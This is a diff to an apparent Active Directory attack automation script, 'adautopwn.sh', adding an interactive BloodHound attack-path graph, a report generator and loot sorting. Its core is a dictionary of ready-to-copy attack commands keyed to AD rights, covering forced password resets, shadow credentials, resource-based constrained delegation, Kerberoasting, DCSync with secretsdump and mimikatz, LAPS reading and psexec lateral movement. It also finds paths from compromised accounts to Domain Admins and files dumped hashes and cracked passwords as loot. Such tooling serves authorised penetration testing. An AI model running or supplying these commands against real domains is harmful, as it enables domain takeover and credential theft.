+  const dx=ev.clientX-lastx, dy=ev.clientY-lasty; if(Math.abs(dx)+Math.abs(dy)>3)moved=true;
+  if(dragN>=0){const [wx,wy]=toWorld(ev.clientX,ev.clientY);N[dragN].fx=wx;N[dragN].fy=wy;N[dragN].x=wx;N[dragN].y=wy;reheat();}
+  else if(panning){tx+=dx;ty+=dy;requestDraw();}
+  else{const i=pick(ev.clientX,ev.clientY); if(i!==hover){hover=i;requestDraw();}
+    const tip=document.getElementById("tip");
+    if(i>=0){tip.style.display="block";tip.style.left=(ev.clientX+14)+"px";tip.style.top=(ev.clientY+14)+"px";
+      tip.innerHTML="<b>"+esc(N[i].label)+"</b><br><span style='color:#9aa7b8'>"+N[i].type+" · "+deg[i]+" edges · click to expand</span>";
+      cv.style.cursor="pointer";}
+    else{tip.style.display="none";cv.style.cursor="";}}
+  lastx=ev.clientX;lasty=ev.clientY;});
+addEventListener("mouseup",ev=>{
+  if(dragN>=0){if(!moved){select(dragN);expand(dragN);} N[dragN].fx=null;N[dragN].fy=null;dragN=-1;}
+  else if(panning){panning=false;cv.classList.remove("grab"); if(!moved){select(-1);} requestDraw();}
+});
+cv.addEventListener("wheel",ev=>{ev.preventDefault();const f=ev.deltaY<0?1.12:1/1.12;
+  const [wx,wy]=toWorld(ev.clientX,ev.clientY); scale=Math.max(0.15,Math.min(4,scale*f));
+  tx=ev.clientX-wx*scale; ty=ev.clientY-wy*scale; requestDraw();},{passive:false});
+
+// ---- selection + panel ----
+function select(i){sel=i; const p=document.getElementById("panel"); requestDraw();
+  if(i<0){p.classList.remove("open");return;}
+  const n=N[i]; p.classList.add("open");
+  document.getElementById("ptype").textContent=n.type;
+  document.getElementById("pname").textContent=n.label;
+  let b=""; if(n.hv)b+="<span class='badge hv'>&#9733; HIGH VALUE</span>";
+  if(n.owned)b+="<span class='badge owned'>&#9760; OWNED</span>";
+  b+="<span class='badge t'>"+deg[i]+" edges</span>";
+  document.getElementById("pbadges").innerHTML=b;
+  renderBody(i);
+}
+function renderBody(i){
+  const n=N[i]; let h="";
+  // outbound abusable edges
+  const out=E.filter(e=>e.s===i);
+  const ab=out.map(e=>abuseCard(i,e)).filter(Boolean);
+  h+="<div class='sect'>&#9876; Abuse from this node</div>";
+  if(ab.length) h+=ab.join("");
+  else h+="<div class='empty'>No directly abusable outbound rights mapped.</div>";
+  // inbound (who can pwn this)
+  const inc=E.filter(e=>e.t===i && key(e.l) in ABUSE);
+  if(inc.length){h+="<div class='sect'>&#9888; Who can take this over</div>";
+    inc.slice(0,30).forEach(e=>{h+="<div class='edge'><span class='rt'>"+e.l+"</span> &larr; "+esc(N[e.s].label)+"</div>";});}
+  // neighbors
+  h+="<div class='sect'>Connections</div>";
+  out.slice(0,40).forEach(e=>{h+="<div class='edge'>&rarr; <span class='rt'>"+e.l+"</span> "+esc(N[e.t].label)+"</div>";});
+  document.getElementById("pbody").innerHTML=h;
+  document.querySelectorAll("#pbody .cmd pre").forEach(pre=>{
+    pre.addEventListener("click",()=>copy(pre.getAttribute("data-cmd")));});
+}
+function abuseCard(si,e){
+  const k=key(e.l); const list=ABUSE[k]; if(!list||!list.length) return "";
+  const src=N[si], dst=N[e.t]; const dt=(dst.type||"").toLowerCase();
+  const rows=list.filter(c=>c.when==="any"||c.when===dt||(c.when==="domain"&&dt==="domain"));
+  const use=rows.length?rows:list.filter(c=>c.when==="any")||list;
+  if(!use.length) return "";
+  let h="<div class='abuse'><div class='ah'><span class='src'>"+esc(short(src.label))+
+    "</span> <span class='arrow'>&mdash;"+e.l+"&rarr;</span> <span class='dst'>"+esc(short(dst.label))+"</span></div>";
+  use.forEach(c=>{const cmd=sub(c.cmd,src,dst);
+    h+="<div class='cmd'><div class='ch'><span class='os "+(c.os==="win"?"win":"linux")+"'>"+
+       (c.os==="win"?"WINDOWS":"LINUX")+"</span>"+esc(c.tool)+"</div>"+
+       "<pre data-cmd='"+escAttr(cmd)+"'><span class='cp'>copy</span>"+esc(cmd)+"</pre></div>";});
+  h+="</div>"; return h;
+}
+function sub(cmd,src,dst){const sN=nshort(src.label), dN=nshort(dst.label);
+  return cmd.replace(/{srcN}/g,sN).replace(/{dstN}/g,dN).replace(/{dom}/g,DOMAIN).replace(/{dc}/g,DCHOST);}
+function nshort(s){return (s||"").split("@")[0];}
+function key(l){return (l||"").toLowerCase().replace(/[^a-z]/g,"");}
+function esc(s){return (s+"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function escAttr(s){return esc(s).replace(/'/g,"&#39;");}
+function copy(t){navigator.clipboard&&navigator.clipboard.writeText(t);const e=document.getElementById("toast");
+  e.classList.add("show");setTimeout(()=>e.classList.remove("show"),1100);}
+document.getElementById("pclose").addEventListener("click",()=>select(-1));
+
+// ---- search across ALL nodes; bring the match (and its neighbours) into view
+const q=document.getElementById("q");
+function doSearch(){const v=q.value.toLowerCase().trim(); if(!v)return; let best=-1;
+  for(let i=0;i<N.length;i++){if((N[i].label||"").toLowerCase()===v){best=i;break;}}
+  if(best<0)for(let i=0;i<N.length;i++){if((N[i].label||"").toLowerCase().includes(v)){best=i;break;}}
+  if(best>=0){expand(best); scale=1.25; tx=W/2-N[best].x*scale; ty=Hh/2-N[best].y*scale; select(best);}}
+q.addEventListener("keydown",ev=>{if(ev.key==="Enter")doSearch();});
+q.addEventListener("input",ev=>{if(ev.target.value.length>2)doSearch();});
+
+// ---- warm up the layout synchronously, then fit (deterministic first paint)
+function warmup(iters){ alpha=1; for(let k=0;k<(iters||320);k++) step(); fit(); fitted=true; requestDraw(); }
+
+// ---- reset to the focused starting view ----
+const rb=document.getElementById("reset");
+if(rb) rb.addEventListener("click",()=>{vis.clear();
+  N.forEach((n,i)=>{if(n.owned||n.hv||n.p)vis.add(i);});
+  if(vis.size<2)[...N.keys()].sort((a,b)=>deg[b]-deg[a]).slice(0,25).forEach(i=>vis.add(i));
+  N.forEach(n=>{const a=Math.random()*6.28,rad=120+Math.random()*240;n.x=Math.cos(a)*rad;n.y=Math.sin(a)*rad;n.vx=n.vy=0;n.fx=n.fy=null;});
+  refresh(); select(-1); q.value=""; warmup();});
+addEventListener("keydown",ev=>{if(ev.key==="Escape")select(-1);});
+
+// ---- boot ----
+resize(); refresh(); warmup();
+</script>
+</body>
+</html>
+'''
+
+# --- Abuse knowledge base: Linux + Windows commands per ACL right ----------
+# Placeholders: {srcN}=controlling principal (short), {dstN}=target (short),
+#               {dom}=domain, {dc}=DC host/ip
+ABUSE = {
+ "genericall": [
+  {"os":"linux","when":"user","tool":"certipy (Shadow Creds → NT hash)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
+  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
+  {"os":"win","when":"user","tool":"Whisker (Shadow Creds)","cmd":"Whisker.exe add /target:{dstN}"},
+  {"os":"win","when":"user","tool":"PowerView (reset pwd)","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
+  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
+  {"os":"win","when":"group","tool":"PowerView (add member)","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
+  {"os":"linux","when":"computer","tool":"RBCD (impacket+bloodyAD)","cmd":"impacket-addcomputer {dom}/'{srcN}':'<pass>' -computer-name 'PWN$' -computer-pass 'Pwn123!' -dc-ip {dc} && bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add rbcd '{dstN}' 'PWN$' && impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'PWN$':'Pwn123!' -dc-ip {dc}"},
+  {"os":"win","when":"computer","tool":"RBCD (Powermad+Rubeus)","cmd":"New-MachineAccount -MachineAccount PWN -Password (ConvertTo-SecureString 'Pwn123!' -AsPlainText -Force); Set-ADComputer {dstN} -PrincipalsAllowedToDelegateToAccount PWN$; Rubeus.exe s4u /user:PWN$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
+ ],
+ "genericwrite": [
+  {"os":"linux","when":"user","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dc} --request-user {dstN}"},
+  {"os":"linux","when":"user","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
+  {"os":"win","when":"user","tool":"PowerView (set SPN → roast)","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
+  {"os":"linux","when":"group","tool":"bloodyAD (add self)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
+ ],
+ "writedacl": [
+  {"os":"linux","when":"any","tool":"impacket-dacledit (grant FullControl)","cmd":"impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"linux","when":"domain","tool":"bloodyAD (grant DCSync)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add genericAll '{dstN}' '{srcN}'  # then DCSync"},
+  {"os":"win","when":"any","tool":"PowerView (grant rights)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
+  {"os":"win","when":"domain","tool":"PowerView (grant DCSync)","cmd":"Add-DomainObjectAcl -TargetIdentity '{dom}' -PrincipalIdentity '{srcN}' -Rights DCSync"},
+ ],
+ "writeowner": [
+  {"os":"linux","when":"any","tool":"impacket-owneredit + dacledit","cmd":"impacket-owneredit -action write -new-owner '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc} && impacket-dacledit -action write -rights FullControl -principal '{srcN}' -target '{dstN}' {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"win","when":"any","tool":"PowerView (take ownership)","cmd":"Set-DomainObjectOwner -Identity '{dstN}' -OwnerIdentity '{srcN}'; Add-DomainObjectAcl -TargetIdentity '{dstN}' -PrincipalIdentity '{srcN}' -Rights All"},
+ ],
+ "owns": "writeowner",
+ "addkeycredentiallink": [
+  {"os":"linux","when":"any","tool":"certipy (Shadow Creds)","cmd":"certipy shadow auto -u '{srcN}@{dom}' -p '<pass>' -account '{dstN}' -dc-ip {dc}"},
+  {"os":"linux","when":"any","tool":"pywhisker","cmd":"pywhisker.py -d {dom} -u '{srcN}' -p '<pass>' --target '{dstN}' --action add --dc-ip {dc}"},
+  {"os":"win","when":"any","tool":"Whisker","cmd":"Whisker.exe add /target:{dstN}"},
+ ],
+ "forcechangepassword": [
+  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
+  {"os":"linux","when":"any","tool":"net rpc","cmd":"net rpc password '{dstN}' 'Newp@ss123!' -U {dom}/'{srcN}'%'<pass>' -S {dc}"},
+  {"os":"win","when":"any","tool":"PowerView","cmd":"Set-DomainUserPassword -Identity {dstN} -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)"},
+ ],
+ "addmember": [
+  {"os":"linux","when":"any","tool":"bloodyAD","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} add groupMember '{dstN}' '{srcN}'"},
+  {"os":"win","when":"any","tool":"PowerView","cmd":"Add-DomainGroupMember -Identity '{dstN}' -Members '{srcN}'"},
+ ],
+ "addself": "addmember",
+ "allextendedrights": [
+  {"os":"linux","when":"user","tool":"bloodyAD (ForceChangePassword)","cmd":"bloodyAD -u '{srcN}' -p '<pass>' -d {dom} --host {dc} set password '{dstN}' 'Newp@ss123!'"},
+  {"os":"linux","when":"domain","tool":"impacket-secretsdump (DCSync)","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
+ ],
+ "writespn": [
+  {"os":"linux","when":"any","tool":"targetedKerberoast","cmd":"python3 targetedKerberoast.py -u '{srcN}' -p '<pass>' -d {dom} --dc-ip {dc} --request-user {dstN}"},
+  {"os":"win","when":"any","tool":"PowerView+Rubeus","cmd":"Set-DomainObject -Identity {dstN} -Set @{{serviceprincipalname='nonexistent/ADAPwn'}}; Rubeus.exe kerberoast /user:{dstN} /nowrap"},
+ ],
+ "addspn": "writespn",
+ "allowedtoact": [
+  {"os":"linux","when":"any","tool":"impacket-getST (RBCD)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+  {"os":"win","when":"any","tool":"Rubeus s4u","cmd":"Rubeus.exe s4u /user:{srcN} /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{dstN}.{dom} /ptt"},
+ ],
+ "allowedtodelegate": [
+  {"os":"linux","when":"any","tool":"impacket-getST (constrained deleg)","cmd":"impacket-getST -spn cifs/{dstN}.{dom} -impersonate Administrator {dom}/'{srcN}':'<pass>' -dc-ip {dc}"},
+ ],
+ "dcsync": [
+  {"os":"linux","when":"any","tool":"impacket-secretsdump","cmd":"impacket-secretsdump {dom}/'{srcN}':'<pass>'@{dc} -just-dc"},
+  {"os":"win","when":"any","tool":"mimikatz","cmd":"lsadump::dcsync /domain:{dom} /user:Administrator"},
+ ],
+ "getchanges": "dcsync",
+ "getchangesall": "dcsync",
+ "synclapspassword": [
+  {"os":"linux","when":"any","tool":"netexec (read LAPS)","cmd":"nxc ldap {dc} -u '{srcN}' -p '<pass>' --module laps"},
+ ],
+ "adminto": [
+  {"os":"linux","when":"any","tool":"evil-winrm / psexec","cmd":"impacket-psexec {dom}/'{srcN}':'<pass>'@{dstN}.{dom}   # or: evil-winrm -i {dstN} -u {srcN} -p '<pass>'"},
+  {"os":"win","when":"any","tool":"PsExec","cmd":"PsExec.exe \\\\{dstN} cmd"},
+ ],
+}
+# resolve string aliases
+for k,v in list(ABUSE.items()):
+    if isinstance(v,str): ABUSE[k]=ABUSE.get(v,[])
+
+def write_html(payload, meta):
+    tpl = HTML_TEMPLATE
+    tpl = tpl.replace("__DATA__", json.dumps(payload))
+    tpl = tpl.replace("__ABUSE__", json.dumps(ABUSE))
+    tpl = tpl.replace("__DOMAIN__", json.dumps(DOM))
+    tpl = tpl.replace("__DC__", json.dumps(DC))
+    tpl = tpl.replace("__META__", json.dumps(meta))
+    with open(HTML,"w") as f: f.write(tpl)
+
+# ---- load zip -------------------------------------------------------------
+files = {}
+if ZIP and os.path.exists(ZIP):
+    try:
+        with zipfile.ZipFile(ZIP) as z:
+            for n in z.namelist():
+                if n.lower().endswith(".json"):
+                    try: files[n] = json.load(z.open(n))
+                    except Exception: pass
+    except Exception: files = {}
+
+# auto-derive the domain from the zip when it wasn't supplied (standalone mode)
+if DOM in ("domain.local","domain",""):
+    for _n,_d in files.items():
+        if "domains" in _n.lower():
+            _data=_d.get("data") if isinstance(_d,dict) else _d
+            if isinstance(_data,list) and _data:
+                _p=_data[0].get("Properties") or {}
+                if _p.get("name"): DOM=_p["name"]; break
+
+def all_records():
+    for name, doc in files.items():
+        data = doc.get("data") if isinstance(doc, dict) else doc
+        meta = doc.get("meta",{}) if isinstance(doc, dict) else {}
+        t = (meta or {}).get("type","")
+        if isinstance(data, list):
+            for r in data: yield t, r
+
+nodes = {}
+edges = []
+HVNAME = ["DOMAIN ADMINS","ENTERPRISE ADMINS","ADMINISTRATORS","DOMAIN CONTROLLERS",
+          "SCHEMA ADMINS","ACCOUNT OPERATORS","BACKUP OPERATORS","KEY ADMINS",
+          "ENTERPRISE KEY ADMINS","SERVER OPERATORS","PRINT OPERATORS","KRBTGT"]
+
+def add_node(sid, label, ntype, hv=False):
+    if not sid: return
+    n = nodes.get(sid)
+    if n is None:
+        nodes[sid] = {"id":sid,"label":label or sid,"type":ntype or "Base","hv":bool(hv),"owned":False}
+    else:
+        if label and n["label"]==sid: n["label"]=label
+        if hv: n["hv"]=True
+        if ntype and n["type"]=="Base": n["type"]=ntype
+
+def P(r): return r.get("Properties") or {}
+
+TYPEMAP = {"users":"User","groups":"Group","computers":"Computer","domains":"Domain",
+           "gpos":"GPO","ous":"OU","containers":"Container"}
+
+for t, r in all_records():
+    nt = TYPEMAP.get(t,"Base")
+    p = P(r); sid = r.get("ObjectIdentifier")
+    name = p.get("name") or p.get("distinguishedname") or sid
+    hv = bool(p.get("highvalue", False))
+    if nt=="Group" and any(k in (name or "").upper() for k in HVNAME): hv=True
+    if nt=="Domain": hv=True
+    add_node(sid, name, nt, hv)
+
+def ensure(sid, t="Base"):
+    if sid and sid not in nodes:
+        add_node(sid, sid, TYPEMAP.get((t or "").lower()+"s", t if t else "Base"))
+
+for t, r in all_records():
+    sid = r.get("ObjectIdentifier")
+    if not sid: continue
+    for ace in (r.get("Aces") or []):
+        ps = ace.get("PrincipalSID"); rn = ace.get("RightName") or "ACE"
+        if not ps: continue
+        ensure(ps, ace.get("PrincipalType","Base")); edges.append([ps, sid, rn])
+    for m in (r.get("Members") or []):
+        mid = m.get("ObjectIdentifier")
+        if mid: ensure(mid, m.get("ObjectType","Base")); edges.append([mid, sid, "MemberOf"])
+    for a in (r.get("AllowedToAct") or []):
+        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
+        if aid: ensure(aid); edges.append([aid, sid, "AllowedToAct"])
+    la = r.get("LocalAdmins") or {}
+    res = la.get("Results") if isinstance(la, dict) else la
+    for a in (res or []):
+        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
+        if aid: ensure(aid); edges.append([aid, sid, "AdminTo"])
+    for a in (r.get("AllowedToDelegate") or []):
+        aid = a.get("ObjectIdentifier") if isinstance(a,dict) else a
+        if aid: ensure(aid); edges.append([sid, aid, "AllowedToDelegate"])
+
+# ---- owned (compromised) nodes from valid_creds_map.txt -------------------
+owned = set()
+if OWNED and os.path.exists(OWNED):
+    for line in open(OWNED, errors="ignore"):
+        tok = line.strip().split()
+        if tok:
+            u = tok[0].split(":")[0].split("@")[0].upper()
+            if u: owned.add(u)
+name2sid = {}
+for sid,n in nodes.items():
+    lbl=(n["label"] or "").upper()
+    name2sid.setdefault(lbl, sid); name2sid.setdefault(lbl.split("@")[0], sid)
+for u in owned:
+    for cand in (u, u+"@"+DOM.upper()):
+        if cand in name2sid: nodes[name2sid[cand]]["owned"]=True; break
+
+# ---- attack paths: BFS owned → high-value, mark edges ---------------------
+adj = defaultdict(list)
+for i,(s,t,l) in enumerate(edges): adj[s].append((t,i))
+hv = {sid for sid,n in nodes.items() if n["hv"]}
+onpath_e=set(); onpath_n=set()
+def bfs(start):
+    if start not in nodes: return
+    prev={start:None}; pe={}; q=deque([start]); tgt=None
+    while q:
+        u=q.popleft()
+        if u in hv and u!=start: tgt=u; break
+        for v,ei in adj.get(u,[]):
+            if v not in prev: prev[v]=u; pe[v]=ei; q.append(v)
+    if tgt:
+        nd=tgt
+        while prev[nd] is not None:
+            onpath_e.add(pe[nd]); onpath_n.add(nd); nd=prev[nd]
+        onpath_n.add(start)
+owned_sids=[sid for sid,n in nodes.items() if n["owned"]]
+for s in owned_sids: bfs(s)
+if not onpath_e:
+    for i,(s,t,l) in enumerate(edges):
+        if t in hv and l!="MemberOf": onpath_e.add(i); onpath_n.add(s); onpath_n.add(t)
+
+# ---- prune for readability (keep all if small) ----------------------------
+keep=set(onpath_n)|hv|set(owned_sids)
+inb=defaultdict(list)
+for s,t,l in edges: inb[t].append(s)
+for sid in list(keep):
+    for v,ei in adj.get(sid,[]): keep.add(v)
+    for v in inb.get(sid,[]): keep.add(v)
+if len(nodes)<=450: keep=set(nodes.keys())
+
+idx={}; out_nodes=[]
+for sid in keep:
+    n=nodes.get(sid)
+    if not n: continue
+    idx[sid]=len(out_nodes)
+    out_nodes.append({"id":sid,"label":n["label"],"type":n["type"],
+                      "hv":n["hv"],"owned":n["owned"],"p":sid in onpath_n})
+seen=set(); out_edges=[]
+for i,(s,t,l) in enumerate(edges):
+    if s in idx and t in idx:
+        k=(s,t,l)
+        if k in seen: continue
+        seen.add(k)
+        out_edges.append({"s":idx[s],"t":idx[t],"l":l,"p":i in onpath_e})
+
+meta = "%d nodes · %d edges · %s%s" % (len(out_nodes), len(out_edges), DOM,
+        "" if files else "  (no BloodHound data)")
+write_html({"nodes":out_nodes,"edges":out_edges}, meta)
+print("graph.html: %d nodes / %d edges" % (len(out_nodes), len(out_edges)))
+PYEOF
+}
+
+# Open a file in the user's browser, but only when a desktop session exists
+# (silently no-ops over SSH/headless so it never blocks an unattended run).
+open_in_browser() {
+    local f="$1"; [[ "$NO_OPEN" == "1" || "$STEALTH" == "1" ]] && return
+    [[ -z "$DISPLAY" && -z "$WAYLAND_DISPLAY" ]] && return
+    if   have xdg-open; then ( xdg-open "$f"  >/dev/null 2>&1 & )
+    elif have firefox;  then ( firefox  "$f"  >/dev/null 2>&1 & )
+    elif have google-chrome; then ( google-chrome "$f" >/dev/null 2>&1 & )
+    else return; fi
+    info "Opened graph.html in your browser"
+}
+
+phase_bloodhound_graph() {
+    [[ "$DO_BLOODHOUND" != "1" ]] && return
+    have python3 || { warn "python3 unavailable → skipping graph.html"; return; }
+    local zip; zip=$(ls -t "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1)
+    local html="$OUTDIR/graph.html"
+    subsection "Rendering interactive attack graph (graph.html)"
+    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="$OUTDIR/valid_creds_map.txt" \
+    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-$DC_IP}" render_graph_py
+    if [[ -s "$html" ]]; then
+        loot "Interactive attack graph → graph.html (open in a browser — offline)"
+        open_in_browser "$html"
+    else
+        warn "Could not generate graph.html"
+    fi
+}
+
+# Standalone: turn a BloodHound zip straight into the interactive graph and open
+# it — no scan, no creds. `adautopwn.sh --graph data.zip [-d domain] [-o dir]`
+graph_only_mode() {
+    local zip="$GRAPH_ZIP"
+    have python3 || die "python3 is required to render the graph"
+    [[ -f "$zip" ]] || die "BloodHound zip not found: $zip"
+    zip="$(cd "$(dirname "$zip")" && pwd)/$(basename "$zip")"
+    local outdir html
+    outdir="${OUTDIR:-$(dirname "$zip")}"; mkdir -p "$outdir"
+    html="$outdir/graph.html"
+    section "BLOODHOUND → INTERACTIVE GRAPH (standalone)"
+    info "Source zip: ${C_BOLD}$zip${C_RESET}"
+    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="${OWNED_FILE:-}" \
+    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-${DC_IP:-domain.local}}" render_graph_py | sed 's/^/  /'
+    if [[ -s "$html" ]]; then
+        loot "Interactive attack graph → ${C_BOLD}$html${C_RESET}"
+        open_in_browser "$html"
+    else
+        die "Could not generate the graph from $zip"
+    fi
+}
+
+# ===========================================================================
+#  LOOT CONSOLIDATION  —  fewer files at the top, intermediates tucked away
+#  Runs once at the very end. High-value + resume-critical files stay at root;
+#  everything else is grouped into enum/ · secrets/ · raw/. Empty files pruned.
+# ===========================================================================
+finalize_loot() {
+    [[ -z "$OUTDIR" || ! -d "$OUTDIR" ]] && return
+    section "LOOT CONSOLIDATION"
+
+    # 1) prune zero-byte files at top level (keep the log even if empty)
+    find "$OUTDIR" -maxdepth 1 -type f -empty ! -name 'adautopwn.log' -delete 2>/dev/null
+
+    # 2) group intermediates; resume-critical + trophies stay at root
+    mkdir -p "$OUTDIR/enum" "$OUTDIR/secrets" "$OUTDIR/raw"
+    _mv_loot() { local dst="$1"; shift; local f
+        for f in "$@"; do [[ -e "$OUTDIR/$f" ]] && mv -f "$OUTDIR/$f" "$OUTDIR/$dst/" 2>/dev/null; done; }
+
+    _mv_loot enum users_enum.txt users_rpc.txt users_ridbrute.txt users_variants.txt \
+        users_variants_valid.txt domain_users.txt domain_groups.txt user_descriptions.txt \
+        pass_policy.txt enum4linux.json nmap_dc.txt domain_wordlist.txt shares_auth.txt \
+        _userenum_seed.txt _asrep_seed.txt
+
+    _mv_loot secrets laps.txt gmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
+        coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
+        deleted_objects.txt
+
+    local f
+    for f in "$OUTDIR"/acl_writable_*.txt;          do [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/secrets/" 2>/dev/null; done
+    for f in "$OUTDIR"/filehash_*.txt "$OUTDIR"/content_*.txt "$OUTDIR"/decrypted_* "$OUTDIR"/cracked_files.txt; do
+        [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/raw/" 2>/dev/null; done
+
+    # 3) drop subdirs that ended up empty
+    rmdir "$OUTDIR"/enum "$OUTDIR"/secrets "$OUTDIR"/raw 2>/dev/null
+    ok "Loot consolidated → trophies at root · details in enum/ · secrets/ · raw/"
+}
+
+# ===========================================================================
+#  CONSOLIDATED REPORT  —  one human-readable index of the whole engagement
+# ===========================================================================
+gen_report() {
+    [[ -z "$OUTDIR" ]] && return
+    local r="$OUTDIR/report.md" o="$OUTDIR"
+    # grep -c always prints a single number (0 when no match); capturing it
+    # avoids the "0\n0" doubling you get from `&& grep || echo 0`.
+    _grepc(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
+    local n_users n_asrep n_kerb n_ntlm n_crack
+    n_users=$( [[ -s "$o/users_all.txt" ]] && wc -l <"$o/users_all.txt" || echo 0 )
+    n_asrep=$(_grepc krb5asrep "$o/asrep_hashes.txt")
+    n_kerb=$( _grepc krb5tgs   "$o/kerberoast_hashes.txt")
+    n_ntlm=$( _grepc ':::'     "$o/secretsdump.txt")
+    n_crack=$( [[ -s "$o/cracked_passwords.txt" ]] && wc -l <"$o/cracked_passwords.txt" || echo 0 )
+
+    {
+        echo "# ADAutoPwn — Engagement Report"
+        echo
+        echo "- **Target:** \`$DC_IP\` (${DC_FQDN:-?})"
+        echo "- **Domain:** ${DOMAIN:-?}"
+        echo "- **Auth mode:** $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
+        echo "- **Authenticated as:** $([[ $HAVE_AUTH == 1 ]] && echo "\`$USER\` ✅" || echo "—")"
+        echo "- **Generated:** $(date '+%Y-%m-%d %H:%M:%S')"
+        echo
+        echo "## At a glance"
+        echo
+        echo "| Metric | Count |"
+        echo "|---|---|"
+        echo "| Users enumerated | $n_users |"
+        echo "| AS-REP hashes | $n_asrep |"
+        echo "| Kerberoast hashes | $n_kerb |"
+        echo "| NTLM hashes (DCSync) | $n_ntlm |"
+        echo "| Cracked passwords | $n_crack |"
+        echo
+        echo "## Attack graph"
+        echo
+        echo "Open [\`graph.html\`](graph.html) in a browser — interactive, offline, highlights paths to Domain Admins/DC."
+        echo
+
+        if [[ -s "$o/valid_creds_map.txt" ]]; then
+            echo "## Working identities (provenance)"; echo
+            echo '```'; sort -u "$o/valid_creds_map.txt"; echo '```'; echo
+        fi
+        if [[ -s "$o/credential_map.txt" ]]; then
+            echo "## Recovered secrets"; echo
+            echo '```'; sort -u "$o/credential_map.txt"; echo '```'; echo
+        fi
+        if grep -qiE 'ESC[0-9]+' "$o/certipy_find.txt" 2>/dev/null; then
+            echo "## ⚠ Vulnerable ADCS templates"; echo
+            echo '```'; grep -iE 'Template Name|ESC[0-9]+' "$o/certipy_find.txt" | head -40; echo '```'; echo
+        fi
+        local acl; acl=$(ls "$o"/acl_writable_*.txt 2>/dev/null | head -1)
+        if [[ -n "$acl" ]]; then
+            echo "## Exploitable ACLs"; echo
+            echo "Writable rights detected — see \`secrets/$(basename "$acl")\`. Re-run with \`--abuse\` to weaponize."; echo
+        fi
+        # Only real trust results have "attr: value" lines; skip bloodyAD's
+        # NoResultError dump (which echoes the filter and trips a naive grep).
+        if [[ -s "$o/trusts.txt" ]] && grep -qE 'trustPartner: *[^ ]|trustDirection: *[0-9]' "$o/trusts.txt" 2>/dev/null; then
+            echo "## Domain trusts"; echo
+            echo '```'; grep -E 'trustPartner: |trustDirection: |trustType: |flatName: ' "$o/trusts.txt" | head -20; echo '```'; echo
+        fi
+
+        echo "## Loot layout"; echo
+        echo "- Root: trophies + resume files (\`users_all.txt\`, \`found_passwords.txt\`, hashes, \`*.ccache\`, \`report.md\`, \`graph.html\`)"
+        echo "- \`enum/\` — enumeration intermediates (users, groups, policy, nmap, wordlist)"
+        echo "- \`secrets/\` — LAPS/gMSA/GPP/DPAPI, ACL dumps, trusts, ADCS, coercion"
+        echo "- \`shares/\` — looted share contents · \`bloodhound/\` — collection zip · \`raw/\` — misc"
+        echo
+        echo "_Full live log: \`adautopwn.log\`_"
+    } >"$r"
+    ok "Consolidated report → report.md"
+}
+
+# ===========================================================================
 #  FINAL SUMMARY
 # ===========================================================================
 final_summary() {
@@ -1674,6 +2561,15 @@ final_summary() {
         ok "Full map saved → credential_map.txt / valid_creds_map.txt"
     fi
     echo
+
+    # Build the human report + interactive graph, THEN tidy the loot dir
+    # (gen_report/graph read files while they're still at the root).
+    gen_report
+    phase_bloodhound_graph
+    finalize_loot
+
+    echo
+    [[ -s "$OUTDIR/report.md" ]] && loot "Report → report.md   ·   Attack graph → graph.html"
     ok "Done. Full log: $LOGFILE"
